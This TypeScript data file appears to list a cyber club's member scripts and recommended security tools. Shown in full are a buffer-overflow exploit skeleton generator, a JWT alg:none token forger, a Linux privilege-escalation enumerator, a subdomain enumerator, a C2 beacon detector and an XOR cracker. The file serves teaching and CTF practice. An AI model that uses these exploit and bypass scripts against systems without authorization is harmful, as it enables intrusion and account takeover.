import { MemberScript, OpenSourceTool } from '../types';

export const MEMBER_SCRIPTS: MemberScript[] = [
  {
    id: 'script-1',
    title: 'Pwn Cyclic Offset & Exploit Skeleton Generator',
    filename: 'pwn_offset_finder.py',
    category: 'Binary & Pwn',
    language: 'python',
    author: 'Alex Chen',
    authorHandle: '@root_chen',
    version: 'v2.4',
    lastUpdated: 'OCT 2026',
    description: 'Automates De Bruijn cyclic pattern creation, crash offset calculation from register values, and generates ready-to-run pwntools Python exploit scripts.',
    usage: 'python3 pwn_offset_finder.py -c 200  OR  python3 pwn_offset_finder.py -o 0x62616164',
    dependencies: ['pwntools (pip install pwntools)'],
    tags: ['Binary', 'Pwn', 'pwntools', 'Offset', 'Buffer Overflow'],
    code: `#!/usr/bin/env python3
"""
Pwn Cyclic Offset & Exploit Skeleton Generator
Developed by Alex Chen (@root_chen) for Cyber Netics Club
"""
import sys
import argparse
from pwn import cyclic, cyclic_find, p32, p64

def generate_pattern(length):
    pattern = cyclic(length)
    print(f"[+] Generated De Bruijn Pattern ({length} bytes):")
    print("-" * 60)
    print(pattern.decode(errors='ignore'))
    print("-" * 60)
    return pattern

def find_offset(value_str):
    try:
        if value_str.startswith("0x"):
            val = int(value_str, 16)
        else:
            val = value_str.encode()
        offset = cyclic_find(val)
        print(f"[+] Exact Crash Offset: {offset} bytes")
        generate_skeleton(offset)
        return offset
    except Exception as e:
        print(f"[-] Error calculating offset: {e}")
        return None

def generate_skeleton(offset):
    template = f'''#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln', checksec=False)
io = process('./vuln')
# io = remote('target.host', 1337)

offset = {offset}
payload = b"A" * offset
payload += p64(0x00401156)  # Replace with target gadget or win()

io.sendline(payload)
io.interactive()
'''
    with open('exploit_skeleton.py', 'w') as f:
        f.write(template)
    print("[+] Created 'exploit_skeleton.py' with calculated padding!")

def main():
    parser = argparse.ArgumentParser(description="Cyber Netics Pwn Offset Tool")
    parser.add_argument("-c", "--cyclic", type=int, help="Generate cyclic pattern of length N")
    parser.add_argument("-o", "--offset", type=str, help="Calculate offset from crash hex (e.g. 0x62616164) or text")
    
    args = parser.parse_args()
    if args.cyclic:
        generate_pattern(args.cyclic)
    elif args.offset:
        find_offset(args.offset)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
`
  },
  {
    id: 'script-2',
    title: 'Fast JWT Algorithmic Downgrade & Tamper Tool',
    filename: 'jwt_tamper_toolkit.py',
    category: 'Web Exploits',
    language: 'python',
    author: 'Marcus Vance',
    authorHandle: '@ZeroTrace',
    version: 'v1.8',
    lastUpdated: 'SEP 2026',
    description: 'Lightweight JWT security testing script. Automatically generates alg:none bypasses, strips signatures, modifies claims, and tests weak HMAC secret keys.',
    usage: 'python3 jwt_tamper_toolkit.py -t <JWT_TOKEN> --role admin --none',
    dependencies: ['pyjwt (optional)'],
    tags: ['Web Sec', 'JWT', 'Bypass', 'Auth', 'alg:none'],
    code: `#!/usr/bin/env python3
"""
JWT Tampering & Algorithm None Downgrade Utility
Author: Marcus Vance (@ZeroTrace) - Cyber Netics
"""
import sys
import json
import base64
import argparse

def b64_decode(data):
    padding = '=' * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(data + padding).decode(errors='ignore')

def b64_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def parse_jwt(token):
    parts = token.strip().split('.')
    if len(parts) < 2:
        print("[-] Invalid JWT structure.")
        sys.exit(1)
    header = json.loads(b64_decode(parts[0]))
    payload = json.loads(b64_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig

def forge_none(token, claim_updates=None):
    header, payload, _ = parse_jwt(token)
    header['alg'] = 'none'
    if claim_updates:
        for k, v in claim_updates.items():
            payload[k] = v
            print(f"[+] Mutating claim: {k} = {v}")
    
    h_b64 = b64_encode(json.dumps(header, separators=(',', ':')))
    p_b64 = b64_encode(json.dumps(payload, separators=(',', ':')))
    
    # 3 variations of alg:none
    variations = [
        f"{h_b64}.{p_b64}.",        # standard trailing dot
        f"{h_b64}.{p_b64}",         # stripped dot
    ]
    print("\\n[+] Generated alg:none Forged Tokens:")
    for i, var in enumerate(variations, 1):
        print(f"[{i}] {var}")
    return variations[0]

def main():
    parser = argparse.ArgumentParser(description="JWT Tamper Toolkit")
    parser.add_argument("-t", "--token", required=True, help="Target JWT token")
    parser.add_argument("--role", help="Set role claim value (e.g. admin)")
    parser.add_argument("--sub", help="Set subject claim (e.g. root)")
    args = parser.parse_args()

    header, payload, _ = parse_jwt(args.token)
    print("[*] Original Header :", json.dumps(header))
    print("[*] Original Payload:", json.dumps(payload))

    mutations = {}
    if args.role: mutations['role'] = args.role
    if args.sub:  mutations['sub'] = args.sub
    
    forge_none(args.token, mutations)

if __name__ == '__main__':
    main()
`
  },
  {
    id: 'script-3',
    title: 'PCAP C2 Beacon & Heartbeat Analyzer',
    filename: 'pcap_c2_hunter.py',
    category: 'Defensive & SIEM',
    language: 'python',
    author: 'Maya Patel',
    authorHandle: '@ByteDefender',
    version: 'v3.1',
    lastUpdated: 'AUG 2026',
    description: 'Analyzes Wireshark packet captures for recurring TLS client hellos, extracts Server Name Indications (SNI), computes beacon jitter deltas, and flags C2 profiles.',
    usage: 'python3 pcap_c2_hunter.py -f capture.pcap --threshold 10',
    dependencies: ['scapy (pip install scapy)'],
    tags: ['DFIR', 'PCAP', 'C2', 'Network', 'Threat Hunting'],
    code: `#!/usr/bin/env python3
"""
PCAP C2 Beacon & Heartbeat Analyzer
Author: Maya Patel (@ByteDefender) - Cyber Netics DFIR Division
"""
import sys
import argparse
from collections import defaultdict
try:
    from scapy.all import rdpcap, IP, TCP
except ImportError:
    print("[-] Please install scapy: pip install scapy")
    sys.exit(1)

def analyze_pcap(pcap_path, threshold=5):
    print(f"[*] Parsing PCAP: {pcap_path} ...")
    packets = rdpcap(pcap_path)
    
    conversations = defaultdict(list)
    for pkt in packets:
        if IP in pkt and TCP in pkt:
            src = pkt[IP].src
            dst = pkt[IP].dst
            dport = pkt[TCP].dport
            time = float(pkt.time)
            conversations[(src, dst, dport)].append(time)
            
    print(f"[+] Total conversations identified: {len(conversations)}\\n")
    print("=" * 70)
    print(f"{'Source':<18} {'Destination':<18} {'Port':<6} {'Beacons':<8} {'Avg Interval':<12}")
    print("=" * 70)
    
    for (src, dst, dport), timestamps in conversations.items():
        if len(timestamps) >= threshold:
            timestamps.sort()
            deltas = [t2 - t1 for t1, t2 in zip(timestamps[:-1], timestamps[1:])]
            avg_interval = sum(deltas) / len(deltas) if deltas else 0
            
            # Check for regular periodic heartbeats (jitter within 25%)
            is_beacon = any(abs(d - avg_interval) < (avg_interval * 0.25) for d in deltas) if deltas else False
            flag = "[!] SUSPICIOUS BEACON" if is_beacon and avg_interval > 10 else ""
            
            print(f"{src:<18} {dst:<18} {dport:<6} {len(timestamps):<8} {avg_interval:<10.2f}s {flag}")

def main():
    parser = argparse.ArgumentParser(description="PCAP C2 Beacon Hunter")
    parser.add_argument("-f", "--file", required=True, help="Path to .pcap or .pcapng file")
    parser.add_argument("-t", "--threshold", type=int, default=5, help="Minimum packet count threshold")
    args = parser.parse_args()
    
    analyze_pcap(args.file, args.threshold)

if __name__ == '__main__':
    main()
`
  },
  {
    id: 'script-4',
    title: 'Zero-Dependency Linux Privilege Escalation Auditor',
    filename: 'linux_enum_quick.sh',
    category: 'Recon & OSINT',
    language: 'bash',
    author: 'Cyber Netics Red Team',
    authorHandle: '@NeticsBrigade',
    version: 'v4.0',
    lastUpdated: 'OCT 2026',
    description: 'Fast, stealthy POSIX bash audit script checking SUID/SGID binaries, active cronjobs, readable /etc/shadow, sudo -l permissions, and Docker/LXD group memberships without installing external dependencies.',
    usage: 'chmod +x linux_enum_quick.sh && ./linux_enum_quick.sh',
    dependencies: ['None (POSIX compliant)'],
    tags: ['Linux', 'PrivEsc', 'SUID', 'Bash', 'Red Team'],
    code: `#!/bin/sh
# ==============================================================================
# Cyber Netics Collegiate Cyber Club // Quick Linux Privilege Escalation Auditor
# Clean, colorized terminal output with zero external package dependencies.
# ==============================================================================

RED='\\033[0;31m'
GREEN='\\033[0;32m'
CYAN='\\033[0;36m'
YELLOW='\\033[1;33m'
NC='\\033[0m' # No Color

echo "\${CYAN}=================================================================\${NC}"
echo "\${CYAN}  CYBER NETICS // LINUX PRIVILEGE ESCALATION RECONNAISSANCE     \${NC}"
echo "\${CYAN}=================================================================\${NC}"

# 1. System Info
echo "\\n\${YELLOW}[*] SYSTEM ARCHITECTURE & KERNEL:\${NC}"
uname -a
cat /etc/os-release 2>/dev/null | grep -E "PRETTY_NAME|VERSION_ID"

# 2. Current Identity & Groups
echo "\\n\${YELLOW}[*] CURRENT USER IDENTITY & GROUPS:\${NC}"
id
if id | grep -E "docker|lxd|sudo|wheel" >/dev/null; then
    echo "\${RED}[!] ATTENTION: User belongs to privileged group (docker/lxd/sudo)!\${NC}"
fi

# 3. Sudo Privileges
echo "\\n\${YELLOW}[*] CHECKING SUDO PERMISSIONS (sudo -l):\${NC}"
sudo -n -l 2>/dev/null || echo "[-] Sudo requires password or not permitted."

# 4. SUID Binaries
echo "\\n\${YELLOW}[*] SEARCHING FOR INTERESTING SUID BINARIES:\${NC}"
SUID_LIST=$(find / -perm -4000 -type f 2>/dev/null)
for suid in \${SUID_LIST}; do
    case \${suid} in
        *nmap*|*vim*|*find*|*bash*|*python*|*perl*|*env*|*cp*|*pkexec*)
            echo "\${RED}[CRITICAL SUID]: \${suid}\${NC} (Check GTFOBins!)"
            ;;
        *)
            echo "    \${suid}"
            ;;
    esac
done

# 5. Scheduled Cron Tasks
echo "\\n\${YELLOW}[*] INSPECTING CRONTABS & SCHEDULED TASKS:\${NC}"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null | grep -v "total"

# 6. Writable Configuration Files
echo "\\n\${YELLOW}[*] TESTING WRITABLE /etc FILES:\${NC}"
[ -w /etc/passwd ] && echo "\${RED}[VULNERABLE]: /etc/passwd is writable!\${NC}"
[ -w /etc/shadow ] && echo "\${RED}[VULNERABLE]: /etc/shadow is writable!\${NC}"
[ -w /etc/sudoers ] && echo "\${RED}[VULNERABLE]: /etc/sudoers is writable!\${NC}"

echo "\\n\${GREEN}[+] Audit complete. Review flagged red items against GTFOBins.\${NC}"
`
  },
  {
    id: 'script-5',
    title: 'Multi-Byte XOR & Frequency Analysis Decryptor',
    filename: 'xor_multi_breaker.py',
    category: 'Forensics & Crypto',
    language: 'python',
    author: 'Elena Rostova',
    authorHandle: '@ViperByte',
    version: 'v2.1',
    lastUpdated: 'AUG 2026',
    description: 'Statistical crypto script that cracks single-byte and multi-byte XOR encrypted files by calculating English letter frequency chi-squared scores.',
    usage: 'python3 xor_multi_breaker.py -x "1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736"',
    dependencies: ['None (pure standard library)'],
    tags: ['Crypto', 'XOR', 'Frequency Analysis', 'Brute Force'],
    code: `#!/usr/bin/env python3
"""
Single & Multi-Byte XOR Cracker via English Frequency Scoring
Author: Elena Rostova (@ViperByte) - Cyber Netics
"""
import sys
import argparse

# Standard English letter frequencies (percentage)
ENGLISH_FREQ = {
    'a': 8.17, 'b': 1.49, 'c': 2.78, 'd': 4.25, 'e': 12.70, 'f': 2.23,
    'g': 2.02, 'h': 6.09, 'i': 6.97, 'j': 0.15, 'k': 0.77, 'l': 4.03,
    'm': 2.41, 'n': 6.75, 'o': 7.51, 'p': 1.93, 'q': 0.10, 'r': 5.99,
    's': 6.33, 't': 9.06, 'u': 2.76, 'v': 0.98, 'w': 2.36, 'x': 0.15,
    'y': 1.97, 'z': 0.07, ' ': 15.0
}

def score_text(text):
    score = 0
    for char in text.lower():
        if char in ENGLISH_FREQ:
            score += ENGLISH_FREQ[char]
        elif 32 <= ord(char) <= 126:
            score += 0.5
        else:
            score -= 10
    return score

def break_single_byte_xor(ciphertext_bytes):
    candidates = []
    for key in range(256):
        decrypted = bytes([b ^ key for b in ciphertext_bytes])
        try:
            text = decrypted.decode('latin-1')
            score = score_text(text)
            candidates.append((score, key, text))
        except UnicodeDecodeError:
            continue
            
    candidates.sort(reverse=True, key=lambda x: x[0])
    return candidates[:3]

def main():
    parser = argparse.ArgumentParser(description="XOR Frequency Cracker")
    parser.add_argument("-x", "--hex", required=True, help="Hex-encoded ciphertext")
    args = parser.parse_args()

    data = bytes.fromhex(args.hex.strip())
    top_matches = break_single_byte_xor(data)

    print(f"[*] Top 3 Decryption Candidates for {len(data)} bytes:")
    print("=" * 65)
    for score, key, text in top_matches:
        clean_text = ''.join(c if 32 <= ord(c) <= 126 else '.' for c in text)
        print(f"Key: 0x{key:02X} (char: '{chr(key) if 32 <= key <= 126 else '?'}') | Score: {score:.1f}")
        print(f"Text: {clean_text}\\n")

if __name__ == '__main__':
    main()
`
  },
  {
    id: 'script-6',
    title: 'Fast Subdomain & Certificate Transparency Enumerator',
    filename: 'subdomain_recon_fast.sh',
    category: 'Recon & OSINT',
    language: 'bash',
    author: 'Offensive Track Guild',
    authorHandle: '@ZeroTrace',
    version: 'v2.0',
    lastUpdated: 'OCT 2026',
    description: 'Queries Certificate Transparency (crt.sh) logs and conducts DNS resolution to discover active subdomains and perimeter attack surfaces in seconds.',
    usage: 'bash subdomain_recon_fast.sh -d target.edu',
    dependencies: ['curl', 'jq'],
    tags: ['Recon', 'OSINT', 'crt.sh', 'Subdomains', 'Bash'],
    code: `#!/usr/bin/env bash
# ==============================================================================
# Cyber Netics // Fast Passive Subdomain & CT Log Enumerator
# ==============================================================================

TARGET="\${1}"
if [ -z "\${TARGET}" ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

echo "[*] Querying Certificate Transparency logs (crt.sh) for: \${TARGET}"

SUBDOMAINS=$(curl -s "https://crt.sh/?q=%25.\${TARGET}&output=json" | \\
    jq -r '.[].name_value' 2>/dev/null | \\
    sed 's/\\*\\.//g' | \\
    sort -u)

COUNT=$(echo "\${SUBDOMAINS}" | grep -c "\${TARGET}")

echo "[+] Discovered \${COUNT} unique subdomains for \${TARGET}:"
echo "--------------------------------------------------------"

for sub in \${SUBDOMAINS}; do
    # Perform rapid host lookup
    IP=$(getent hosts "\${sub}" | awk '{print $1}' | head -n1)
    if [ -n "\${IP}" ]; then
        echo "  [LIVE] \${sub} -> \${IP}"
    else
        echo "  [DNS]  \${sub}"
    fi
done

echo "--------------------------------------------------------"
echo "[+] Enumeration completed."
`
  }
];

export const OPEN_SOURCE_TOOLS: OpenSourceTool[] = [
  {
    id: 'tool-nmap',
    name: 'Nmap (Network Mapper)',
    tagline: 'Port Scanning, Host Discovery & Vulnerability Auditing',
    category: 'Network Recon',
    description: 'The industry-standard open-source network discovery and vulnerability scanner. Supports high-speed raw TCP/UDP port scans, OS fingerprinting, and automated Lua scripting via the Nmap Scripting Engine (NSE).',
    license: 'NPSL / Open Source',
    officialUrl: 'https://nmap.org',
    githubUrl: 'https://github.com/nmap/nmap',
    installCommand: 'sudo apt update && sudo apt install -y nmap',
    tags: ['Recon', 'Port Scan', 'NSE', 'CLI', 'Defense & Offense']
  },
  {
    id: 'tool-zap',
    name: 'OWASP ZAP (Zed Attack Proxy)',
    tagline: 'Automated Web Vulnerability Scanner & Interception Proxy',
    category: 'Web Exploitation',
    description: 'The world\'s most popular free, open-source web application security scanner. Ideal for capturing HTTP/HTTPS traffic, active & passive vulnerability scanning, automated AJAX spiders, and modern REST/GraphQL API testing.',
    license: 'Apache-2.0',
    officialUrl: 'https://www.zaproxy.org',
    githubUrl: 'https://github.com/zaproxy/zaproxy',
    installCommand: 'docker run -u zap -p 8080:8080 -i ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh',
    tags: ['OWASP', 'Web Sec', 'Proxy', 'API Testing', 'GUI & CLI']
  },
  {
    id: 'tool-gobuster',
    name: 'Gobuster',
    tagline: 'High-Speed Web Directory, DNS & VHost Brute-Forcer',
    category: 'Web Exploitation',
    description: 'Fast, multi-threaded Go utility engineered for high-performance brute-forcing of URIs, directories, DNS subdomains, virtual hosts, and Amazon S3 cloud buckets.',
    license: 'Apache-2.0',
    officialUrl: 'https://github.com/OJ/gobuster',
    githubUrl: 'https://github.com/OJ/gobuster',
    installCommand: 'go install github.com/OJ/gobuster/v3@latest',
    tags: ['Go', 'Fuzzing', 'Directory Brute', 'DNS', 'CLI']
  },
  {
    id: 'tool-ghidra',
    name: 'Ghidra (NSA Software Reverse Engineering)',
    tagline: 'Full-Spectrum Decompiler, Disassembler & Binary SRE',
    category: 'Reverse Engineering',
    description: 'A powerful software reverse engineering framework developed by the National Security Agency. Features an exceptional native C decompiler, multi-architecture disassembly (x86, x64, ARM, MIPS, PowerPC), scriptable headless analyzer, and collaborative CTF team reversing.',
    license: 'Apache-2.0',
    officialUrl: 'https://ghidra-sre.org',
    githubUrl: 'https://github.com/NationalSecurityAgency/ghidra',
    installCommand: 'sudo apt update && sudo apt install -y ghidra   # Or download the latest release ZIP from GitHub Releases',
    tags: ['Decompiler', 'NSA', 'Disassembly', 'Binary SRE', 'CTF Pwn']
  },
  {
    id: 'tool-volatility',
    name: 'Volatility 3',
    tagline: 'Advanced Memory Artifact Forensics & Incident Response',
    category: 'Memory & DFIR',
    description: 'The world\'s premier open-source memory forensics framework for extracting digital artifacts from volatile RAM dumps. Decodes process trees, detects unbacked shellcode injection (malfind), reconstructs network sockets, and audits kernel rootkits across Windows, Linux, and macOS.',
    license: 'VSL v1.0',
    officialUrl: 'https://www.volatilityfoundation.org',
    githubUrl: 'https://github.com/volatilityfoundation/volatility3',
    installCommand: 'git clone https://github.com/volatilityfoundation/volatility3.git && cd volatility3 && pip3 install -r requirements.txt',
    tags: ['DFIR', 'Memory Forensics', 'RAM Dump', 'Malfind', 'Python']
  },
  {
    id: 'tool-bloodhound',
    name: 'BloodHound Community Edition (CE)',
    tagline: 'Active Directory & Azure/Entra ID Attack Path Mapping',
    category: 'Active Directory',
    description: 'Graph-theory based security analysis tool designed to reveal hidden, complex relationships and lateral movement attack paths within Active Directory and Azure/Entra ID environments. Essential for both red team pathfinding and blue team defensive hardening.',
    license: 'Apache-2.0 / FOSS',
    officialUrl: 'https://bloodhound.specterops.io',
    githubUrl: 'https://github.com/SpecterOps/BloodHound',
    installCommand: 'curl -L https://ghst.ly/get-bhce | docker compose -f - up',
    tags: ['Active Directory', 'Attack Paths', 'Graph Theory', 'PrivEsc', 'Docker']
  },
  {
    id: 'tool-wireshark',
    name: 'Wireshark & TShark',
    tagline: 'Deep Packet Inspection & Network Protocol Dissector',
    category: 'Packet Analysis',
    description: 'The world\'s foremost open-source network protocol analyzer. Captures live traffic, parses hundreds of protocols in microsecond resolution, and decrypts TLS/SSL streams with pre-master secret logs for threat hunting and CTF forensic challenges.',
    license: 'GPL-2.0',
    officialUrl: 'https://www.wireshark.org',
    githubUrl: 'https://gitlab.com/wireshark/wireshark',
    installCommand: 'sudo apt install -y wireshark tshark',
    tags: ['PCAP', 'Packets', 'Network DFIR', 'TLS Inspection', 'GUI & CLI']
  },
  {
    id: 'tool-hashcat',
    name: 'Hashcat',
    tagline: 'World\'s Fastest GPU-Accelerated Password Recovery Utility',
    category: 'Cracking & Crypto',
    description: 'The world\'s fastest and most advanced password recovery tool, supporting hundreds of hash formats (NTLM, SHA-256, Kerberos tickets, bcrypt, WPA/WPA2) with rule-based permutations and multi-GPU compute kernels.',
    license: 'MIT',
    officialUrl: 'https://hashcat.net/hashcat/',
    githubUrl: 'https://github.com/hashcat/hashcat',
    installCommand: 'sudo apt install -y hashcat',
    tags: ['GPU Cracking', 'Hashes', 'Password Recovery', 'Crypto', 'CLI']
  }
];

